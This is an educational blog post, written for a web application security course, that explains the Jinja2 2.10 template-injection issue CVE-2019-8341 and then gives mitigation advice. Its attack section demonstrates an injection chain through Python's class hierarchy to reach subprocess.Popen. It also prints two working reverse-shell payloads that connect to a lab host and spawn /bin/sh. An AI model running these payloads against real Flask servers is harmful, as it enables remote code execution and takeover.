<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Language" content="en">
    <meta name="color-scheme" content="light dark">

    

    <meta name="author" content="Adin Drabkin">
    <meta name="description" content="note: this blog was originally written for CSEC 380 (Principles of Web Application Security) @ RIT">
    <meta name="keywords" content="">

    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Abusing Templates and Inheritance – Why CVE-2019-8341 Works (Flask/Jinja2 2.10)"/>
<meta name="twitter:description" content="note: this blog was originally written for CSEC 380 (Principles of Web Application Security) @ RIT"/>

    <meta property="og:title" content="Abusing Templates and Inheritance – Why CVE-2019-8341 Works (Flask/Jinja2 2.10)" />
<meta property="og:description" content="note: this blog was originally written for CSEC 380 (Principles of Web Application Security) @ RIT" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://adindrabkin.com/blog/csec-380-blog-cve-2019-8341/" /><meta property="article:section" content="blog" />
<meta property="article:published_time" content="2021-05-09T00:00:00+00:00" />
<meta property="article:modified_time" content="2021-05-09T00:00:00+00:00" />


    <title>
  Abusing Templates and Inheritance – Why CVE-2019-8341 Works (Flask/Jinja2 2.10) · Adin Drabkin
</title>

    
      <link rel="canonical" href="https://adindrabkin.com/blog/csec-380-blog-cve-2019-8341/">
    

    <link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>

    
      
      
      <link rel="stylesheet" href="/css/coder.min.7b314bd953f9bf97050dc5a58a3bc9cea394b9438d373447ddfe7365d5efe091.css" integrity="sha256-ezFL2VP5v5cFDcWlijvJzqOUuUONNzRH3f5zZdXv4JE=" crossorigin="anonymous" media="screen" />
    

    

    
      
        
        
        <link rel="stylesheet" href="/css/coder-dark.min.ccbbada2e264e4fdbf9b2181cccc2cdb289a63dc9520a1e96ac2b9a45778df29.css" integrity="sha256-zLutouJk5P2/myGBzMws2yiaY9yVIKHpasK5pFd43yk=" crossorigin="anonymous" media="screen" />
      
    

    

    

    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">

    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

    <meta name="generator" content="Hugo 0.111.3">
  </head>

  
  
    
  
  <body class="preload-transitions colorscheme-auto">
    
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


    <main class="wrapper">
      <nav class="navigation">
  <section class="container">
    <a class="navigation-title" href="/">
      Adin Drabkin
    </a>
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
        
        
        
          <li class="navigation-item">
            <a class="navigation-link" href="/" >Home</a>
          </li>
        
        
        
          <li class="navigation-item">
            <a class="navigation-link" href="/about/" >About</a>
          </li>
        
        
        
          <li class="navigation-item">
            <a class="navigation-link" href="/blog/" >Blog</a>
          </li>
        
        
        
          <li class="navigation-item">
            <a class="navigation-link" href="/tools/" >Tools</a>
          </li>
        
      
        
    </ul>
  
</section>
</nav>

      <div class="content">
        
  <section class="container page">
  <article>
    <header>
      <h1 class="title">
        <a class="title-link" href="https://adindrabkin.com/blog/csec-380-blog-cve-2019-8341/">
          Abusing Templates and Inheritance – Why CVE-2019-8341 Works (Flask/Jinja2 2.10)
        </a>
      </h1>
    </header>

    <p><img src="/images/blog/2021_05_09/1.png" alt=""></p>
<p><em>note: this blog was originally written for CSEC 380 (Principles of Web Application Security) @ RIT</em></p>
<h1 id="introduction">
  Introduction
  <a class="heading-link" href="#introduction">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<p>Flask is micro web framework that is able to receive requests, execute functions, and return the result of the function to the requesting web client. It Is classified as a Web Server Gateway Interface (“WSGI&quot;). WSGIs are constantly running on the server machine (calling a function upon receiving a request), while classical CGI webservers call a script upon receiving a request.</p>
<p>Flask relies on Werkzeug, a WSGI utility library, and Jinja, a templating engine. This allows for the server to easily customize webpages given the parameters of a request.</p>
<p>When used correctly, Flask is a very powerful tool due to the customization it provides. However, this customization can come at the cost of security, in an ill-configured environment.</p>
<p>This blog post is aimed at readers with a low-moderate understanding of how python objects work, as it dives into python object inheritance.</p>
<h1 id="what-is-cve-2019-8341">
  What is CVE-2019-8341?
  <a class="heading-link" href="#what-is-cve-2019-8341">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<p>CVE-2019-8341 is a disputed vulnerability that exists within Jinja2 2.10. When creating an Jinja2 environment from a string), it interprets <code>{{</code> as a print statement starting, and <code>}}</code> as a print statement ending. So if <code>{{ some code }}</code> was located in the python string, it would attempt to print it, resulting in  <code>some code</code>  being evaluated.</p>
<p>Practically, when Jinja2 loads a template containing  <code>{{ message }}</code>, it expects said template to be given a parameter, such as <code>Template.render(message =&quot;hello world&quot;)</code>.  This will result in  <code>{{ message }}</code>  being replaced with <code>hello world</code>. This is considered safe because it automatically escapes any characters that could be interpreted as commands.</p>
<p>CVE-2019-8341 is disputed because  <code>{{ some untrusted code }}</code>  should never exist in a template to begin with<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>. It is argued that Jinja2 2.10 works as expected, as it is simply rendering the HTML given to it.  <code>from_string</code>  is intended to only render a trusted string, provided by the server, rather than an untrusted string, provided by the client.</p>
<p>In the following example, an environment is created from a basic HTML snippet, to demonstrate the functionality of  <code>from_string</code>:</p>
<p><img src="/images/blog/2021_05_09/2.png" alt=""></p>
<h1 id="hypothesis">
  Hypothesis
  <a class="heading-link" href="#hypothesis">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<p>If the Flask/Jinja2 webserver is vulnerable to basic server side template injection (SSTI), sending the parameter  <code>{{ 2 * 2 }}</code>  will cause Jinja to evaluate  <code>2 * 2</code> , resulting it in displaying <code>4</code>.</p>
<p>If our hypothesis is proven as true, we can attempt to use python inheritance to gain a reverse shell onto the webserver.</p>
<h1 id="testing-environment">
  Testing Environment
  <a class="heading-link" href="#testing-environment">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<p>A docker environment was prepared with the python:3.8 image. To collect the right version of Jinja2, a requirements.txt file containing the following was downloaded:</p>
<p>Jinja2==2.10.0</p>
<p>Flask==0.12.2</p>
<p>requests==2.18.2</p>
<p>The flask server was configured to serve two items, one being the stylesheet for the page, and the other being the page&rsquo;s HTML. The page&rsquo;s HTML is formatted with the message that the client provides.</p>
<p>Flask&rsquo;s  <code>render_template_string</code>  is used, as it relies on Jinja2&rsquo;s  <code>from_string</code>. This provides a more realistic example, as when using flask, there is never a reason to directly call Jinja2&rsquo;s from_string—especially on untrusted content.</p>
<p><img src="/images/blog/2021_05_09/1.png" alt=""></p>
<p><em>Figure 1: The Flask/Jinja2 2.10 application. Note: “HTML&quot; is set to a string containing the code seen in figure 2</em></p>
<p><img src="/images/blog/2021_05_09/3.png" alt=""></p>
<p><em>Figure 2 – The source code for the example website</em></p>
<p><img src="/images/blog/2021_05_09/4.png" alt=""></p>
<p><em>Figure 3 – Result of passing the parameter “hello world&quot;</em></p>
<p><img src="/images/blog/2021_05_09/5.png" alt=""></p>
<p><em>Figure 4 – Attack Breakdown</em></p>
<h1 id="the-attack">
  The Attack
  <a class="heading-link" href="#the-attack">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<h2 id="part-1-testing-for-ssti">
  Part 1: Testing for SSTI
  <a class="heading-link" href="#part-1-testing-for-ssti">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h2>
<p>Now that we understand how the server side template injection (SSTI) can occur, we can immediately test our hypothesis by passing  <code>?message={{ 2 * 2 }}</code>. Major browsers like Chrome will take care of the encoding behind the scenes.</p>
<p>As we can see, this results in the webpage displaying 4:</p>
<p><img src="/images/blog/2021_05_09/7.png" alt=""></p>
<h2 id="part-2-utilizing-python-object-inheritance">
  Part 2: Utilizing python object inheritance
  <a class="heading-link" href="#part-2-utilizing-python-object-inheritance">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h2>
<p>Now that we know the server will evaluate the code that we give it, we can attempt to traverse the python object tree until we reach a useful command.</p>
<p>&quot;&quot; is a string, who&rsquo;s class str is an object—and like all python objects, it has a <code>__class__</code> method. The expression  <code>&quot;&quot;.__class__</code> evaluates to str. Here is the result from putting <code>&quot;&quot;.__class__</code> as the message parameter:</p>
<p><img src="/images/blog/2021_05_09/8.png" alt=""></p>
<p>Now that we have a literal str object, we can assess its methods. One of these methods is <code>__mro__</code>, which stands for method resolution order. Essentially, MRO tells python in what order the classes&rsquo; methods should be resolved<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>. This order begins with the class itself (&lsquo;str&rsquo; in our case), before moving onto its parent(s).</p>
<p>Now, when we pass <code>&quot;&quot;.__class__.__mro__</code> , we can see the tuple (str, object):</p>
<p><img src="/images/blog/2021_05_09/9.png" alt=""></p>
<p>Bingo! The “object&quot; class is located. This happens because all objects inherit the object class. Since all objects inherit the object class, all objects are subclasses of the object class. We can then index the tuple that <code>__mro__</code> returns to select object, and then check its subclasses. Our command is now <code>&quot;&quot;.__class__.__mro__[1].__subclasses__()</code></p>
<p><img src="/images/blog/2021_05_09/10.png" alt=""></p>
<p>One of these subclasses is subprocess.Popen, which allows for python to create child processes on the machine. Again, we must grab the index of the function we want.</p>
<p>A quick copy and paste into an ipython script gives us the index subprocess.Popen, being 411.</p>
<p><img src="/images/blog/2021_05_09/11.png" alt=""></p>
<p>Now appending 411 to our command: <code>&quot;&quot;.__class__.__mro__[1].__subclasses__()[411]</code></p>
<p><img src="/images/blog/2021_05_09/12.png" alt=""></p>
<p>To test command execution, we can tell subprocess.Popen to execute “ls&quot;, and communicate the results. This is done by appending <code>('ls',shell=True,stdout=-1).communicate()[0]</code> to our command.</p>
<p><code>&quot;&quot;.__class__.__mro__[1].__subclasses__()[411]('ls',shell=True,stdout=-1).communicate()[0]</code></p>
<p><img src="/images/blog/2021_05_09/13.png" alt=""></p>
<h2 id="part-3-reverse-shell">
  Part 3: Reverse Shell
  <a class="heading-link" href="#part-3-reverse-shell">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h2>
<p>Although a reverse shell is out of the scope of the vulnerability, it helps demonstrate the immense power one could take over a vulnerable Flask/Jinja2.0 server using from­_string. It is also obligatory when pwning a machine.</p>
<p>Feel free to skip to the Mitigations section.</p>
<p>We can spin up a netcat listener by executing <code>nc -lv 4445</code>. This is being ran on the host MacOS machine. If it was Kali, you would enter <code>sudo nc -lvnp [port]</code>.</p>
<p><img src="/images/blog/2021_05_09/14.png" alt=""></p>
<p>Our final command is:</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0ff;font-weight:bold">&#34;&#34;</span>.__class__.__mro__[<span style="color:#ff0;font-weight:bold">1</span>].__subclasses__()[<span style="color:#ff0;font-weight:bold">411</span>](<span style="color:#0ff;font-weight:bold">&#39;export RHOST=&#34;192.168.65.2&#34;; export RPORT=4445; python -c </span><span style="color:#0ff;font-weight:bold">\&#39;</span><span style="color:#0ff;font-weight:bold">import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&#34;RHOST&#34;),int(os.getenv(&#34;RPORT&#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&#34;/bin/sh&#34;)</span><span style="color:#0ff;font-weight:bold">\&#39;</span><span style="color:#0ff;font-weight:bold">&#39;</span>,shell=<span style="color:#fff;font-weight:bold">True</span>,stdout=-<span style="color:#ff0;font-weight:bold">1</span>)
</span></span></code></pre></div><p>When executed, the website acts as normal—despite the subprocess executing:</p>
<p><img src="/images/blog/2021_05_09/15.png" alt=""></p>
<p>While on our machine we see that the netcat listener has picked up a connection to the target:</p>
<p><img src="/images/blog/2021_05_09/16.png" alt=""></p>
<p>Here is one more flask reverse shell to try in the event that the command above does not stay connected to your attack box:</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>.__class__.__mro__[<span style="color:#ff0;font-weight:bold">1</span>].__subclasses__()[<span style="color:#ff0;font-weight:bold">441</span>](<span style="color:#0ff;font-weight:bold">&#39;python -c </span><span style="color:#0ff;font-weight:bold">\&#39;</span><span style="color:#0ff;font-weight:bold">a=__import__;b=a(&#34;socket&#34;);c=a(&#34;subprocess&#34;).call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((&#34;192.168.65.2&#34;,4445));f=s.fileno;c([&#34;/bin/sh&#34;,&#34;-i&#34;],stdin=f(),stdout=f(),stderr=f())</span><span style="color:#0ff;font-weight:bold">\&#39;</span><span style="color:#0ff;font-weight:bold">&#39;</span>,shell=<span style="color:#fff;font-weight:bold">True</span>,stdout=-<span style="color:#ff0;font-weight:bold">1</span>)}}
</span></span></code></pre></div><h1 id="mitigations">
  Mitigations
  <a class="heading-link" href="#mitigations">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<p>Despite from_string receiving numerous patches, SSTI has still been possible by using other characters and formats<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>. The underlying issue—and the reason the CVE is disputed—continues to be flask/Jinja2 servers that render untrusted content into a template. At the highest level, this issue could be mitigated entirely by first rendering a template, then passing variables as parameters.</p>
<p><img src="/images/blog/2021_05_09/17.png" alt=""></p>
<p><em>Figure 5 – Formatting a string prior to rendering a template</em></p>
<p><img src="/images/blog/2021_05_09/18.png" alt=""></p>
<p><em>Figure 6 – Correctly rendering a template with context</em></p>
<p>In general, it is considered bad practice to use untrusted content—threats are constantly evolving, and more exploits exist. At a minimum, content should be filtered for characters such as  <code>{</code>  and  <code>}</code> , even if Jinja2 escapes characters. Best practice requires validation against character whitelist—containing only characters that the server is prepared to handle<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup>.</p>
<h1 id="conclusion">
  Conclusion
  <a class="heading-link" href="#conclusion">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<p>Flask is a webserver—similar to Nginx and Apache—and should be treated as such. User controlled inputs should not be trusted and have whitelists. Additionally, Flask should be run in a restricted environment, only having the minimum required operating permissions.</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1677653#c4" target="_blank" rel="noreferrer noopener">https://bugzilla.redhat.com/show_bug.cgi?id=1677653#c4</a>
&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p><a href="https://www.programiz.com/python-programming/multiple-inheritance" target="_blank" rel="noreferrer noopener">https://www.programiz.com/python-programming/multiple-inheritance</a>
&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p><a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/" target="_blank" rel="noreferrer noopener">https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/</a>
&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4">
<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html" target="_blank" rel="noreferrer noopener">https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html</a>
&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>

  </article>
</section>

  

      </div>

      <footer class="footer">
  <section class="container">
    ©
    
    2025
     Adin Drabkin 
    ·
    Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
    
  </section>
</footer>

    </main>

    
      
      <script src="/js/coder.min.cb0c595e02234420f3ad3886bf4a9bd2874d0e1e78e090138a9ef158b35aaf17.js" integrity="sha256-ywxZXgIjRCDzrTiGv0qb0odNDh544JATip7xWLNarxc="></script>
    

    

    

    

    

    

    

    

    
  </body>

</html>
